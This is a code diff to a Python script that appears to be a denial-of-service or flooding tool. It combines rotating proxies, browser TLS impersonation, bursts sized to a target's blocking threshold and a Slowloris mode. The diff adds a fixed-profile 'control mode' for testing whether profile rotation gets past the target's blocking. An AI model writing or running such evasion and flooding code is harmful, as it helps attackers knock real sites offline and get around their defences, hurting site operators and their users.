@@ -133,6 +133,12 @@ class ProfileCycle:
 
 PROFILE_CYCLE = ProfileCycle(BROWSER_PROFILES)
 
+# Set by --fixed-profile for controlled A/B testing: when not None, every
+# request uses this single (impersonate, ua) pair instead of rotating —
+# lets you isolate "does profile rotation matter" from "did the block
+# window just reset" by running rotating vs fixed back-to-back.
+FIXED_PROFILE = None
+
 
 # ─────────────────────────────────────────────────────────────────────────────
 #  PROXY POOL
@@ -240,7 +246,10 @@ def send_one(req_num, cfg, pool):
 
     domain = cfg["url"].split("/")[2]
     label  = proxy if proxy else "direct (own IP)"
-    impersonate, ua = PROFILE_CYCLE.next()
+    if FIXED_PROFILE is not None:
+        impersonate, ua = FIXED_PROFILE
+    else:
+        impersonate, ua = PROFILE_CYCLE.next()
 
     t0 = time.time()
     try:
@@ -474,6 +483,11 @@ def main():
                    help="Concurrent requests per burst (default: auto from known threshold)")
     p.add_argument("--proxy-file",  default=PROXY_FILE,
                    help=f"Path to proxy list file (default: {PROXY_FILE})")
+    p.add_argument("--fixed-profile", default=None, metavar="NAME",
+                   help="Control mode: use ONE browser profile for every request instead\n"
+                        "of rotating (e.g. --fixed-profile chrome124). Run this back-to-back\n"
+                        "with the default rotating mode, same concurrency, to isolate whether\n"
+                        "profile rotation actually matters vs. the block window just resetting.")
     p.add_argument("--no-proxy",    action="store_true",
                    help="Skip the proxy pool entirely — send every request from this\n"
                         "machine's own IP (still uses TLS impersonation).")
@@ -497,6 +511,15 @@ def main():
     p.add_argument("--port",        type=int, default=80,
                    help="Slowloris: target port (default: 80; use 8080 if needed)")
     args = p.parse_args()
+
+    if args.fixed_profile:
+        global FIXED_PROFILE
+        match = next((pr for pr in BROWSER_PROFILES if pr[0] == args.fixed_profile), None)
+        if match is None:
+            print(f"\n  {R}[ERROR]{W} Unknown profile: {args.fixed_profile}")
+            print(f"  Available: {', '.join(p[0] for p in BROWSER_PROFILES)}\n")
+            sys.exit(1)
+        FIXED_PROFILE = match
 
     # ── slowloris: domain not required, can run standalone with --origin ─────
     if args.slowloris:
@@ -594,7 +617,7 @@ def main():
   Unit Tag    : {cfg['unit_tag']}
   Concurrency : {concurrency} per burst  (threshold = {cfg['threshold']})
   Proxies     : {(str(pool.alive()) + " alive — rotating per request") if pool else "NONE — sending from this machine's own IP"}
-  TLS         : rotating {len(BROWSER_PROFILES)} real browser profiles (TLS+UA matched per request)
+  TLS         : {("FIXED — " + FIXED_PROFILE[0] + " for every request (control mode)") if FIXED_PROFILE else f"rotating {len(BROWSER_PROFILES)} real browser profiles (TLS+UA matched per request)"}
   Mode        : Continuous until Ctrl+C
 {B}{'='*66}{W}
 """)
